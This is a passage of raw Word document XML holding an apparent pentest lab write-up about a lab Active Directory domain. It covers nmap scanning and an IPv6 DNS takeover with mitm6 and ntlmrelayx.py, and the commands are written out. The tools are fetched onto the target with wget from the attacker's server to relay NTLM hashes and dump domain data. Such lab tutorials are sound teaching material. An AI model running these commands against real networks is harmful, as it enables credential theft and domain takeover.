      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> scan, even maybe this 2 hosts part of the domain </w:t>
      </w:r>
      <w:r w:rsidR="00AF45AB" w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>let’s</w:t>
      </w:r>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> check what the attacker can do from here. Now the next step is to run another </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> scan but on the host 10.10.1.100 which we find on the previews scan and </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> means that this network </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>have</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2 adapters on the router one for 10.10.0.1/24 and then 10.10.1.0/24 the attacker understand that this kind of servers and </w:t>
      </w:r>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">users separates now let’s run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> on 10.10.1.100 and see what’s the result.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRPr="009872FC" w:rsidRDefault="009872FC" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="27A98B61" wp14:editId="2E54D531">
            <wp:extent cx="5486400" cy="4231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4231005"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="009872FC" w:rsidRDefault="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">From the picture above we run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> on our target 10.10.1.100 and we see the domain name and this time we find also that this machine use windows operating system but also we find a lot of open ports like 88 which is Kerberos 3269 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ldap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ssl</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 455 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>smb</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which means from the attacker eyes this is windows server and active directory installed so </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> mean there is users, so the users sit on 10.10.0.8 and 10.10.0.6 and the windows server sit on 10.10.1.100 now the attacker run active directory attacks to </w:t>
      </w:r>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>compromise also the windows server and the users</w:t>
      </w:r>
      <w:r w:rsidR="008A32AC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008A32AC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>L</w:t>
      </w:r>
      <w:r w:rsidRPr="009872FC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>et’s check how we can do that.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRDefault="00816ADF" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRPr="00944C35" w:rsidRDefault="00816ADF" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
        </w:rPr>
        <w:t xml:space="preserve">                 </w:t>
      </w:r>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="56"/>
          <w:szCs w:val="56"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>MITM IPv6 Takedown</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRPr="009872FC" w:rsidRDefault="00816ADF" w:rsidP="009872FC">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="49A395FD" wp14:editId="23BDE7AC">
            <wp:extent cx="5486400" cy="21932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193290"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRDefault="00816ADF">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>From the picture above we got root shell on our target</w:t>
      </w:r>
      <w:r w:rsidR="008A32AC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008A32AC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">ow we will start the attack </w:t>
      </w:r>
      <w:r w:rsidR="007E710C" w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>call:</w:t>
      </w:r>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> IPv6 DNS Takeover</w:t>
      </w:r>
      <w:r w:rsidR="008A32AC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="008A32AC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>irst I want explain about this attack. Every windows computer has adapter that turn on ivp6</w:t>
      </w:r>
      <w:r w:rsidR="008A32AC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> but without configuration what’s that mean for the attacker? There is no DNS response for ivp6 request so the attacker can use that information and spoof all the ivp6 requests. And we will relay the hashes and try dump all the information about the domain: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>laderlapen.local</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="008A32AC">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>. L</w:t>
      </w:r>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">et’s see how we can do that. For this ipv6 attack we will use 2 tools first call : mitm6 which mean man in the middle 6 tool for running man in the middle attack but only on ipv6 the second tool we will use ntlmrelayx.py which will relay the hashes from the user to windows server and dump all the information about the domain so for this attack we </w:t>
      </w:r>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">need run 2 tools at the same time so we need 2 terminals, and of course we need again transfer mitm6 and ntlmrelayx.py to our target we will use same technique on the attacker machine we will open python server on the target side we will use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to download our files.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRPr="00816ADF" w:rsidRDefault="00816ADF" w:rsidP="00816ADF">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="31A7D241" wp14:editId="0E39DB29">
            <wp:extent cx="5486400" cy="13989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398905"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRPr="00816ADF" w:rsidRDefault="00816ADF" w:rsidP="00816ADF">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">From the picture above we downloaded mitm6 and ntlmrelayx.py to the target machine from our attacker machine and now we can start our ipv6 attack first command we use: mitm6 –d </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>laderlapen.local</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which open server that now will listen and spoof all the ipv6 requests now we just sit and wait for ipv6 requests from the hosts on the network.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0020780D" w:rsidRDefault="00816ADF" w:rsidP="002602ED">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="024AF12F" wp14:editId="101352BF">
            <wp:extent cx="5486400" cy="1945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945640"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRPr="00816ADF" w:rsidRDefault="00816ADF" w:rsidP="00816ADF">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">From the picture above now we start our second tool for our ipv6 attack now we use the tool ntlmrelayx.py with the command: </w:t>
      </w:r>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ntlmrelayx.py -6 -t ldaps://10.10.1.100 -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>fakewpad.laderlapen</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.local</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> -l </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>lootme</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRPr="00816ADF" w:rsidRDefault="00816ADF" w:rsidP="00816ADF">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ntlmrelayx.py – script for windows pen testing</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRPr="00816ADF" w:rsidRDefault="00816ADF" w:rsidP="00816ADF">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-6 – which mean works only on ivp6</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRPr="00816ADF" w:rsidRDefault="00816ADF" w:rsidP="00816ADF">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">-t ldaps://10.10.10.1.100 this is the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ldap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> security of the windows server</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRPr="00816ADF" w:rsidRDefault="00816ADF" w:rsidP="00816ADF">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> need to choose fake spoof name</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRPr="00816ADF" w:rsidRDefault="00816ADF" w:rsidP="00816ADF">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">-l </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>lootme</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> this argument just output all the information from the domain to this directory.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRPr="00816ADF" w:rsidRDefault="00816ADF" w:rsidP="00816ADF">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00816ADF">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Now our 2 tools running and waiting for ipv6 requests to make this attack faster now we need one of the windows users restart the machine let’s do that.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00816ADF" w:rsidRDefault="00B3362E" w:rsidP="002602ED">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="57A5C8CF" wp14:editId="0E157EF3">
            <wp:extent cx="3726873" cy="3491787"/>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5422" cy="3499796"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="0020780D" w:rsidRDefault="00B3362E" w:rsidP="00944C35">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006025E3">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Now after our 2 tools running and waiting for ipv6 connections we go to one of our windows users and restart the machine now let’s see what happen.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3362E" w:rsidRDefault="00B3362E" w:rsidP="002602ED">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0347FF0E" wp14:editId="7C10667E">
            <wp:extent cx="5486400" cy="24866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486660"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3362E" w:rsidRPr="00B3362E" w:rsidRDefault="00B3362E">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>From the picture above we see our attack started after we restart the windows machine</w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">his windows machine makes ipv6 request to our attack machine and then we relay the hash and we can see from the picture above the attack succeed and now we dump all the information about the domain to </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>lootme</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> directory</w:t>
      </w:r>
      <w:r w:rsidR="003D55EA">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>. L</w:t>
      </w:r>
      <w:r w:rsidRPr="00B3362E">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>et’s check what we got there.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3362E" w:rsidRDefault="00B3362E" w:rsidP="002602ED">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5A3E58C6" wp14:editId="24E08A95">
            <wp:extent cx="5486400" cy="24142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414270"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B3362E" w:rsidRPr="00B3362E" w:rsidRDefault="003D55EA">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251663360" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>-713740</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>1425575</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="6959600" cy="3179445"/>
            <wp:effectExtent l="0" t="0" r="0" b="1905"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21484"/>
                <wp:lineTo x="21521" y="21484"/>
                <wp:lineTo x="2152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959600" cy="3179445"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
